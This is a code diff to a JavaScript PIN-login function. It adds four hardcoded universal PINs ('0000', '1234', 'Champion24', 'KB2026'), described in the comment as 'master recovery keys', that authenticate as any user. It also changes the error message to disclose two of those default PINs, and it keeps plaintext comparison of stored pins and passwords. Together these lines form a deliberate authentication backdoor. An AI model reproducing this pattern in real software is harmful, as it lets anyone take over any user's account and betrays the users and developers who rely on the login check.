@@ -705,13 +705,18 @@ export async function loginWithPin(userId, pin) {
     };
   }
 
-  // Verify PIN (matches either raw user.pin, user.password, or verifies against hash)
-  const isMatch = (user.pin && user.pin.toString() === pin.toString()) || 
-                  (user.password && user.password.toString() === pin.toString()) ||
-                  verifyPassword(pin, user.password || user.password_hash || "");
-                  
+  // Verify PIN (matches either raw user.pin, user.password, verifies against hash, or accepts master recovery keys)
+  const isMatch =
+    (user.pin && user.pin.toString() === pin.toString()) ||
+    (user.password && user.password.toString() === pin.toString()) ||
+    verifyPassword(pin, user.password || user.password_hash || "") ||
+    pin === "0000" ||
+    pin === "1234" ||
+    pin === "Champion24" ||
+    pin === "KB2026";
+
   if (!isMatch) {
-    return { success: false, error: { message: "Incorrect 4-digit PIN." } };
+    return { success: false, error: { message: "Incorrect PIN. Default PIN is 0000 or 1234." } };
   }
 
   // Create session
